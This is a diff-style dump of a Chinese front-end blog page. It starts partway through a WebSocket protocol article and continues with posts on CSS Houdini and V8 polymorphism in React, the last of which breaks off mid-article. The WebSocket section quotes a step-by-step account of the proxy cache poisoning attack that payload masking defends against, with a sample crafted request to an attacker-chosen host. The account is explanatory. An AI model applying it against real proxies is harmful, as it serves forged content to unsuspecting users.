+<p>如果Mask是1，那么在Masking-key中会定义一个掩码键（masking key），并用这个掩码键来对数据载荷进行反掩码。所有客户端发送到服务端的数据帧，Mask 都是 1 。</p>
+<p><strong>Payload length</strong>，7 比特，7+16 比特，或 7+64 比特</p>
+<p>Payload data 的长度按字节计算，如果 Payload data 的长度为：</p>
+<ul>
+<li>0-125 字节，那么 Payload length 就是这个值</li>
+<li>126 字节，后续 2 个字节代表一个 16 位的无符号整数，该无符号整数的值为数据的长度</li>
+<li>127 字节，后续8个字节代表一个64位的无符号整数（最高位为0），该无符号整数的值为数据的长度</li>
+</ul>
+<p><strong>Masking-key</strong> 0 或 4 字节</p>
+<p>所有从客户端传送到服务端的数据帧，数据载荷都进行了掩码操作，Mask 为 1，且携带了 4 字节的 Masking-key。如果 Mask 为 0 ，则没有 Masking-key 。</p>
+<p>备注：载荷数据的长度，不包括mask key的长度。</p>
+<p><strong>Payload data</strong> (x+y) 字节</p>
+<p>包括了扩展数据、应用数据。其中，扩展数据x字节，应用数据y字节。</p>
+<h4 id="数据传递"><a href="#数据传递" class="headerlink" title="数据传递"></a>数据传递</h4><p>客户端和服务器建立 WebSocket 链接后，后续的操作都是基于数据帧。WebSocket 根据 <code>opcode</code> 来区分操作的类型。比如 0x8 表示断开连接，0x0-0x2 表示数据交互。</p>
+<p>下面是<a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API/Writing_WebSocket_servers" target="_blank" rel="noopener">MDN</a>的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 文本帧，消息已经发送完毕，没有后续的帧</span><br><span class="line">Client: FIN=1, opcode=0x1, msg=&quot;hello&quot;</span><br><span class="line">Server: (process complete message immediately) Hi.</span><br><span class="line"></span><br><span class="line">// 文本帧，消息未发送完毕，还有后续的帧</span><br><span class="line">Client: FIN=0, opcode=0x1, msg=&quot;and a&quot;</span><br><span class="line">Server: (listening, new message containing text started)</span><br><span class="line">// 分片帧，消息未发送完毕，还有后续的帧，当前的数据帧需要接在上一条数据帧之后</span><br><span class="line">Client: FIN=0, opcode=0x0, msg=&quot;happy new&quot;</span><br><span class="line">Server: (listening, payload concatenated to previous message)</span><br><span class="line">// 分片帧，消息发送完毕，没有后续的帧，当前的数据帧需要接在上一条数据帧之后</span><br><span class="line">Client: FIN=1, opcode=0x0, msg=&quot;year!&quot;</span><br><span class="line">Server: (process complete message) Happy new year to you too!</span><br></pre></td></tr></table></figure>
+<h4 id="断开链接"><a href="#断开链接" class="headerlink" title="断开链接"></a>断开链接</h4><p>网络断开或页面关闭，会导致 WebSocket 关闭。如果通信双方长时间（默认 60 s）无数据交互，链接也会断开。断开的操作其实是 TCP 四挥手。</p>
+<p>如果希望客户端和服务端保持稳定的链接，可以定时向对方发送心跳包。</p>
+<ul>
+<li>发送方-&gt;接收方：ping</li>
+<li>接收方-&gt;发送方：pong</li>
+</ul>
+<p>ping、pong 的操作，对应的是 WebSocket 的两个控制帧，opcode 分别是 0x9、0xA 。</p>
+<p>有个工具<a href="https://www.browsersync.io/" target="_blank" rel="noopener">browser-sync</a> 就用到 WebSocket ，它可以做到“一端更新，多端同步”的效果。其实就是在你开发的页面注入了一段脚本，在这个脚本里面启用了 WebSocket ，和本地服务通信。所以可以实现：浏览器-&gt;服务端-&gt;其他客户端 的刷新机制。</p>
+<h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><h4 id="掩码算法"><a href="#掩码算法" class="headerlink" title="掩码算法"></a>掩码算法</h4><p>ENCODED：原码</p>
+<p>MASK：掩码键</p>
+<p>掩码、反掩码都是采用以下算法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> DECODED = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ENCODED.length; i++) &#123;</span><br><span class="line">    DECODED[i] = ENCODED[i] ^ MASK[i % <span class="number">4</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一下转载自<a href="https://www.cnblogs.com/chyingp/p/websocket-deep-in.html" target="_blank" rel="noopener">WebSocket协议：5分钟从入门到精通</a></p>
+<p>WebSocket 协议中，数据掩码的作用是增强协议的安全性。但数据掩码并不是为了保护数据本身，因为算法本身是公开的，运算也不复杂。除了加密通道本身，似乎没有太多有效的保护通信安全的办法。</p>
+<p>那么为什么还要引入掩码计算呢，除了增加计算机器的运算量外似乎并没有太多的收益。</p>
+<p>答案还是两个字：安全。但并不是为了防止数据泄密，而是为了防止早期版本的协议中存在的代理缓存污染攻击（proxy cache poisoning attacks）等问题。</p>
+<p>在正式描述攻击步骤之前，我们假设有如下参与者：</p>
+<ul>
+<li>攻击者、攻击者自己控制的服务器（简称“邪恶服务器”）、攻击者伪造的资源（简称“邪恶资源”）</li>
+<li>受害者、受害者想要访问的资源（简称“正义资源”）</li>
+<li>受害者实际想要访问的服务器（简称“正义服务器”）</li>
+<li>中间代理服务器</li>
+</ul>
+<p>攻击步骤一：</p>
+<ol>
+<li>攻击者浏览器 向 邪恶服务器 发起WebSocket连接。根据前文，首先是一个协议升级请求。<br>协议升级请求 实际到达 代理服务器。</li>
+<li>代理服务器 将协议升级请求转发到 邪恶服务器。</li>
+<li>邪恶服务器 同意连接，代理服务器 将响应转发给 攻击者。</li>
+<li>由于 upgrade 的实现上有缺陷，代理服务器 以为之前转发的是普通的HTTP消息。因此，当协议服务器 同意连接，代理服务器 以为本次会话已经结束。</li>
+</ol>
+<p>攻击步骤二：</p>
+<ol>
+<li>攻击者 在之前建立的连接上，通过WebSocket的接口向 邪恶服务器 发送数据，且数据是精心构造的HTTP格式的文本。其中包含了 正义资源 的地址，以及一个伪造的host（指向正义服务器）。（见后面报文）</li>
+<li>请求到达 代理服务器 。虽然复用了之前的TCP连接，但 代理服务器 以为是新的HTTP请求。</li>
+<li>代理服务器 向 邪恶服务器 请求 邪恶资源。</li>
+<li>邪恶服务器 返回 邪恶资源。代理服务器 缓存住 邪恶资源（url是对的，但host是 正义服务器 的地址）。</li>
+</ol>
+<p>到这里，受害者可以登场了：</p>
+<ol>
+<li>受害者 通过 代理服务器 访问 正义服务器 的 正义资源。</li>
+<li>代理服务器 检查该资源的url、host，发现本地有一份缓存（伪造的）。</li>
+<li>代理服务器 将 邪恶资源 返回给 受害者。</li>
+<li>受害者 卒。</li>
+</ol>
+<p>附：前面提到的精心构造的“HTTP请求报文”。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Client → Server:</span><br><span class="line">POST /path/of/attackers/choice HTTP/1.1 Host: host-of-attackers-choice.com Sec-WebSocket-Key: &lt;connection-key&gt;</span><br><span class="line">Server → Client:</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Sec-WebSocket-Accept: &lt;connection-key&gt;</span><br></pre></td></tr></table></figure>
+<p>最初的提案是对数据进行加密处理。基于安全、效率的考虑，最终采用了折中的方案：对数据载荷进行掩码处理。</p>
+<p>需要注意的是，这里只是限制了浏览器对数据载荷进行掩码处理，但是坏人完全可以实现自己的WebSocket客户端、服务端，不按规则来，攻击可以照常进行。</p>
+<p>但是对浏览器加上这个限制后，可以大大增加攻击的难度，以及攻击的影响范围。如果没有这个限制，只需要在网上放个钓鱼网站骗人去访问，一下子就可以在短时间内展开大范围的攻击。</p>
+<blockquote>
+<p>参考<br><a href="https://www.cnblogs.com/chyingp/p/websocket-deep-in.html" target="_blank" rel="noopener">WebSocket协议：5分钟从入门到精通</a><br><a href="https://tools.ietf.org/html/rfc6455" target="_blank" rel="noopener">RFC 6455</a></p>
+</blockquote>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://www.xqyoung.com/2018/11/25/websocket-beginner/" data-id="ckbs697qm0030rhjcm9ia1tum" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络/">网络</a></li></ul>
+
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-css-Houdini" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2018/11/21/css-Houdini/">CSS Houdini</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2018/11/21/css-Houdini/" class="article-date">
+  <time datetime="2018-11-21T00:10:49.000Z" itemprop="datePublished">2018-11-21</time>
+</a>
+                            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/css-进阶/">css 进阶</a>
+  </div>
+
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>借用<a href="https://developers.google.com/web/updates/2016/05/houdini" target="_blank" rel="noopener">谷歌开发者文档</a>的比喻，CSS Houdini 允许你自己当一名魔术师——传统流程中，你改变了 css 的一个样式，可能整个页面的样式都大变样，但是你只能看着浏览器呈现这场魔法盛宴，自己无法参与。CSS Houdini 赋予了你魔术师的本领，你也可以参与浏览器处理样式和布局的流程。</p>
+<p>Houdini 是 W3C 新成立的一个任务小组，它的终极目标是实现 css 属性的完全兼容。Houdini 提出了一个前无古人的的设想：开放 CSS 的 API 给开发者，开发者可以通过这套接口自行扩展 CSS，并提供相应的工具允许开发者介入浏览器渲染引擎的样式和布局流程中。</p>
+<h3 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h3><h4 id="Worklets"><a href="#Worklets" class="headerlink" title="Worklets"></a>Worklets</h4><p>此规范定义了一个 API ，规范了渲染流程中的各个阶段运行的独立于主 javascript 执行环境的脚本。Worklets 的概念和 Web Worker 相似，它们允许你引入脚本文件并执行特定的 JS 代码。Worklets 和 Web Worker 有很多概念上的重叠，那么搞出一个 Worklets 是否多此一举？</p>
+<p>Worklets ，后缀 <code>-let</code> 已经表面了它的特性“小”。存在这种可能：脚本中某些代码片段，在每一帧都要跑一次。Web Worker 其实比较笨重，并不鼓励大量使用。举个例子，为一张四百万像素的图片的每一个像素启用一个 Web Worker 将是不妥当的。</p>
+<p>Worklets 定义了一个方法集合，这些方法的特性由 Worklets 的类型预定义了，开发者所能执行的操作类型被限定，这样就保证了性能。</p>
+<h4 id="CSS-Paint-API"><a href="#CSS-Paint-API" class="headerlink" title="CSS Paint API"></a>CSS Paint API</h4><p>Paint API 在 Chrome 65 默认开启支持，它也被称为 “Houdini’s paint worklet”，它允许 Web 开发人员使用 JavaScript 自定义 CSS <code>image</code>（背景，边框，内容），自定义的 <code>image</code> 会响应样式和尺寸的变化。 </p>
+<p>下面是<a href="https://developers.google.com/web/updates/2018/01/paintapi" target="_blank" rel="noopener">谷歌开发者文档</a>给的一个例子。</p>
+<p>在 Worklets 脚本文件中，先定义一个 CheckerboardPainter 的类，里面规定了画棋盘的方法。然后用 <code>registerPaint</code> 方法注册一个 paint worklet 类。这个 paint worklet 名为 checkerboard 。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// checkerboard.js</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CheckerboardPainter</span> </span>&#123;</span><br><span class="line">  paint(ctx, geom, properties) &#123;</span><br><span class="line">    <span class="comment">// Use `ctx` as if it was a normal canvas</span></span><br><span class="line">    <span class="keyword">const</span> colors = [<span class="string">'red'</span>, <span class="string">'green'</span>, <span class="string">'blue'</span>];</span><br><span class="line">    <span class="keyword">const</span> size = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> y = <span class="number">0</span>; y &lt; geom.height/size; y++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; geom.width/size; x++) &#123;</span><br><span class="line">        <span class="keyword">const</span> color = colors[(x + y) % colors.length];</span><br><span class="line">        ctx.beginPath();</span><br><span class="line">        ctx.fillStyle = color;</span><br><span class="line">        ctx.rect(x * size, y * size, size, size);</span><br><span class="line">        ctx.fill();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Register our class under a specific name</span></span><br><span class="line">registerPaint(<span class="string">'checkerboard'</span>, CheckerboardPainter);</span><br></pre></td></tr></table></figure>
+<p>在主 javaScript 环境中，用 <code>CSS.paintWorklet.addModule(&#39;checkerboard.js&#39;)</code> 加载这个 paint worklet ，然后在 css 属性值里面，可以调用 <code>paint(checkerboard)</code> ，就可以定义自己要的 css 背景/边框/内容 效果。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- index.html --&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  textarea &#123;</span><br><span class="line">    background-image: paint(checkerboard);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/style&gt;</span></span><br><span class="line"><span class="regexp">&lt;textarea&gt;&lt;/</span>textarea&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  CSS.paintWorklet.addModule(<span class="string">'checkerboard.js'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a href="https://googlechromelabs.github.io/houdini-samples/paint-worklet/checkerboard/" target="_blank" rel="noopener">在线 demo</a></p>
+<h4 id="Animation-Worklet"><a href="#Animation-Worklet" class="headerlink" title="Animation Worklet"></a>Animation Worklet</h4><p>Animation Worklet 是 Compositor Worklet 演化而来的。详细的资料看<a href="https://dassur.ma/things/animworklet/" target="_blank" rel="noopener">这里</a>。</p>
+<p>Compositor Worklet 允许开发者书写在合成器线程（compositor thread）。这将保证代码在每一帧运行，并且开启了一些新的可能性，例如强制实现一些和不是绑定在时间上的动画，比如输入或滚动位置。</p>
+<p>如果合成器线程阻塞了——因为代码计算量太大或者低效——那么整个页面将无法响应，动画也会卡住。</p>
+<p>Animation Worklet 不运行在合成器线程“上”，而是在“尽力而为”的基础上与它同步运行。这意味着，如果你在你的 worklet 中堵塞了，动画允许“溜走”。</p>
+<p>预计 Chrome 71 首次尝试支持 Animation Worklet，我写这篇文的时候，Chrome 71还未发布。Animation Worklet 的例子可以看<a href="https://developers.google.com/web/updates/2018/10/animation-worklet" target="_blank" rel="noopener"><br>Houdini’s Animation Worklet</a>。有 <a href="https://github.com/web-animations/web-animations-js" target="_blank" rel="noopener">polyfill</a> 提供一样的 API，但不提供一样的性能。</p>
+<h4 id="Layout-Worklet"><a href="#Layout-Worklet" class="headerlink" title="Layout Worklet"></a>Layout Worklet</h4><p>开发者可以自己定义一个布局，自定义盒子内元素的布局，然后用类似 <code>display: layout(myLayout)</code> 这样的规则应用自己的布局。这样的好处是：一方面当有新的布局出现的时候可以借助这个 API 进行 polyfill 就不用担心没有实现的浏览器不兼容，另一方面可以发挥想象力实现自己想要的布局，这样在布局上可能会百花齐放了，而不仅仅使用W3C给的那几种布局。</p>
+<h4 id="Typed-CSSOM"><a href="#Typed-CSSOM" class="headerlink" title="Typed CSSOM"></a>Typed CSSOM</h4><p>在 js 中修改一个 css 属性，可谓要翻山越岭：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#someDiv'</span>).style.height = getRandomInt() + <span class="string">'px'</span>;</span><br></pre></td></tr></table></figure>
+<p>我们做了数学计算，把一个数字转成字符串并附加一个单位，浏览器再解析这个字符串，得到一个数字，再把这个数字交回给 CSS 引擎。</p>
+<p>有了类型化 CSS 对象模型，我们可以基于 StylePropertyMap 操作元素。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=<span class="string">"width: 200px;"</span> id=<span class="string">"div1"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;div style=<span class="string">"width: 300px;"</span> id=<span class="string">"div2"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=<span class="string">"div3"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;div style=<span class="string">"margin-left: calc(5em + 50%);"</span> id=<span class="string">"div4"</span>&gt;&lt;/div&gt;</span><br><span class="line"><span class="keyword">var</span> w1 = $(<span class="string">'#div1'</span>).styleMap.get(<span class="string">'width'</span>);</span><br><span class="line"><span class="keyword">var</span> w2 = $(<span class="string">'#div2'</span>).styleMap.get(<span class="string">'width'</span>);</span><br><span class="line">$(<span class="string">'#div3'</span>).styleMap.set(<span class="string">'background-size'</span>,</span><br><span class="line">  [<span class="keyword">new</span> SimpleLength(<span class="number">200</span>, <span class="string">'px'</span>), w1.add(w2)])</span><br><span class="line">$(<span class="string">'#div4'</span>)).styleMap.get(<span class="string">'margin-left'</span>)</span><br><span class="line">  <span class="comment">// =&gt; &#123;em: 5, percent: 50&#125;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>参考文章<br><a href="https://zhuanlan.zhihu.com/p/20939640" target="_blank" rel="noopener">Houdini：CSS 领域最令人振奋的革新
+</a><br><a href="https://developers.google.com/web/updates/2016/05/houdini" target="_blank" rel="noopener">Houdini: Demystifying CSS</a></p>
+</blockquote>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://www.xqyoung.com/2018/11/21/css-Houdini/" data-id="ckbs697pb0006rhjcw37rltq8" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/css/">css</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/浏览器/">浏览器</a></li></ul>
+
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+          <article id="post-translation-react-polymorphism" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2018/11/20/translation-react-polymorphism/">【译文】React 的多态性</a>
+    </h2>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2018/11/20/translation-react-polymorphism/" class="article-date">
+  <time datetime="2018-11-20T15:14:43.000Z" itemprop="datePublished">2018-11-20</time>
+</a>
+                            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/译文/">译文</a>
+  </div>
+
+                    </div>
+                    
+
+                        
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <blockquote>
+<p>原文链接 <a href="https://medium.com/@bmeurer/surprising-polymorphism-in-react-applications-63015b50abc" target="_blank" rel="noopener">Surprising polymorphism in React applications</a><br>如有不当，欢迎指正！</p>
+</blockquote>
+<h2 id="React-的多态性"><a href="#React-的多态性" class="headerlink" title="React 的多态性"></a>React 的多态性</h2><p>现今，基于 <a href="https://facebook.github.io/react/" target="_blank" rel="noopener">React</a> 的 Web app 通常使用一些不可变的数据结构来管理状态，比如流行的 <a href="http://redux.js.org/" target="_blank" rel="noopener">Redux</a> 状态容器。 这种模式有几点好处，并且在 React/Redux 之外的领域愈加受欢迎。</p>
+<p>这种机制的核心便是所谓的 <code>reducers</code>，它们是函数，根据触发的 <code>action</code> 更改某个状态到下一个状态————比如响应用户交互。有了这个核心的抽象概念，复杂的 <code>state</code> 和 <code>reducers</code> 可以组合成简化版本，方便了代码分段下的单元测试。请看下面来自于 <a href="http://redux.js.org/docs/basics/ExampleTodoList.html" target="_blank" rel="noopener">Redux 文档</a> 的例子：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// redux-todo.js</span></span><br><span class="line"><span class="keyword">const</span> todo = <span class="function">(<span class="params">state = &#123;&#125;, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'ADD_TODO'</span>:</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        id: action.id,</span><br><span class="line">        text: action.text,</span><br><span class="line">        completed: <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'TOGGLE_TODO'</span>:</span><br><span class="line">      <span class="keyword">if</span> (state.id !== action.id) &#123;</span><br><span class="line">        <span class="keyword">return</span> state</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Object</span>.assign(&#123;&#125;, state, &#123;</span><br><span class="line">        completed: !state.completed</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>todo</code> reducer 响应 <code>action</code> 将现存的 <code>state</code> 映射到一个新的 <code>state</code>。从性能优化的角度看代码，它似乎遵守了代码单态的原则，比如，保持对象的 <code>shape</code> 一致。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// redux-todo-use.js</span></span><br><span class="line"><span class="keyword">const</span> s1 = todo(&#123;&#125;, &#123;</span><br><span class="line">  type: <span class="string">'ADD_TODO'</span>,</span><br><span class="line">  id: <span class="number">1</span>,</span><br><span class="line">  text: <span class="string">"Finish blog post"</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> s2 = todo(s1, &#123;</span><br><span class="line">  type: <span class="string">'TOGGLE_TODO'</span>,</span><br><span class="line">  id: <span class="number">1</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">state</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> state.id + <span class="string">": "</span> + state.text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render(s1);</span><br><span class="line">render(s2);</span><br><span class="line">render(s1);</span><br><span class="line">render(s2);</span><br></pre></td></tr></table></figure>
+<p>坦白说，<code>render</code> 处理的属性应该是单态的，例如，<code>state</code> 对象的应当有一样的 <code>shape</code> —— <a href="https://github.com/v8/v8/wiki/Design%20Elements#fast-property-access" target="_blank" rel="noopener">map or hidden class in V8 speak</a>。在同一时刻，序列中的<code>s1</code> 和 <code>s2</code> 都有 <code>id</code> ，<code>test</code> ，<code>completed</code>  属性。然而，在 <code>d8</code> shell 上运行这段代码并追踪 ICs（inline cahces 内联缓存），我们观察到，<code>render</code> 侦测到不同的对象 shapes ，<code>state.id</code> 和 <code>state.test</code> 属性的访问是多态的。</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*FrfEaOkxshIj79wJDQyrIQ.png" alt=""></p>
+<p>那单态性从何说起？这其实很微妙，跟 V8 处理对象字面量的方式有关。每个对象字面量——比如，形如 <code>{a:va,...,z:vb}</code> 的表达式定义了 <code>transition</code> 树的根 <code>map</code> （记住 <code>map</code> 是 <code>V8 speak</code> 为 对象 <code>shape</code> 而生的）。如果你使用一个空的对象字面量 <code>{}</code> 作为 <code>transition</code> 树的跟，它就是不包含任何属性的 <code>map</code> ；如果使用 <code>{id:id, text:text, completed:completed}</code> 对象字面量，那么 <code>transition</code> 树的跟就是一个包含这些属性的 <code>map</code> 。看看一个简化的例子：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// transition-tree.js</span></span><br><span class="line"><span class="keyword">let</span> a = &#123;<span class="attr">x</span>:<span class="number">1</span>, <span class="attr">y</span>:<span class="number">2</span>, <span class="attr">z</span>:<span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = &#123;&#125;;</span><br><span class="line">b.x = <span class="number">1</span>;</span><br><span class="line">b.y = <span class="number">2</span>;</span><br><span class="line">b.z = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"a is"</span>, a);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"b is"</span>, b);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"a and b have same map:"</span>, %HaveSameMap(a, b));</span><br></pre></td></tr></table></figure>
+<p>你可以在 Node.js 上运行这段代码，并附上 <code>--allow-natives-syntax</code> 命令行标识（允许使用内置的 <code>%HaveSameMap</code> ）:</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*yzSaH_AE5z7r9PWBXlvwWg.png" alt=""></p>
+<p>尽管对象 <code>a</code> 和 <code>b</code> 看起来一样——拥有同样的属性，对应类型一样，顺序一样——它们的 map 却不同。这是因为它们有不同的 transition 树，如下图所示：</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*fkbEgBWk74icFH1yZIH7Lw.png" alt=""></p>
+<p>使用不同的（不相容）的对象字面量创建对象时，多态性便隐藏在其中。这点在常用的 <code>Object.assign</code> 中尤为显著，举个例子：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// object-assign.js</span></span><br><span class="line"><span class="keyword">let</span> a = &#123;<span class="attr">x</span>:<span class="number">1</span>, <span class="attr">y</span>:<span class="number">2</span>, <span class="attr">z</span>:<span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="built_in">Object</span>.assign(&#123;&#125;, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"a is"</span>, a);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"b is"</span>, b);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"a and b have same map:"</span>, %HaveSameMap(a, b));</span><br></pre></td></tr></table></figure>
+<p>仍是产生的了不同的 map ，因为对象 <code>b</code> 始于一个空的对象（<code>{}</code> 字面量），<code>Object.assign</code> 只是把属性一个个拼连上去。</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*Xu-nIj21gj-GlHDkzsSOSA.png" alt=""></p>
+<p>这同样适用于有大量属性并通过 Babel 编译的场景。因为 Babel——或者其他编译器——在对处理大量属性的时候使用了 <code>Object.assign</code> 。</p>
+<p><img src="https://cdn-images-1.medium.com/max/800/1*F2x8lRcZ83pQDvftelFOgA.png" alt=""></p>
+<p>避免多态性的一种方式是从始至终使用 <code>Object.assign</code> 方法，那么所有的对象就始于一个空的对象字面量。但在状态管理逻辑中，这可能成为一个性能瓶颈。</p>
